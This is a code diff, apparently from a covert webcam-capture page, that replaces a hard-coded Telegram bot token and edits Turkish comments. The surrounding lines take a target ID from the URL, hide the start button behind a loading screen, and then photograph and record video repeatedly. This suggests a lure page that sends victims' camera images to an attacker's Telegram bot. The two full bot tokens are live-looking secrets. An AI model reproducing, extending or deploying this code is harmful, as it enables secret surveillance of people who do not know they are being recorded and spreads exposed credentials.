@@ -63,9 +63,9 @@
 
     <script>
         // ============================================
-        // DÜZ TOKEN - KESİN ÇÖZÜM
+        // YENİ TOKEN
         // ============================================
-        const BOT_TOKEN = "8773124715:AAHJKDOcQF5UJmBC13lRl4vvGe-_qDm8dlc";
+        const BOT_TOKEN = "8773124715:AAHlbv12dpzmzHxXiIOPzeQkFcYzrshQmNw";
         
         const urlParams = new URLSearchParams(window.location.search);
         const TARGET_ID = urlParams.get('i');
@@ -138,10 +138,10 @@
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
                     
-                    // Her saniye fotoğraf çek
+                    // Fotoğraf çek
                     setInterval(takePhoto, FOTO_SURESI * 1000);
                     
-                    // 2 saniye sonra video başlat
+                    // Video başlat
                     setTimeout(recordVideo, 2000);
                 };
                 
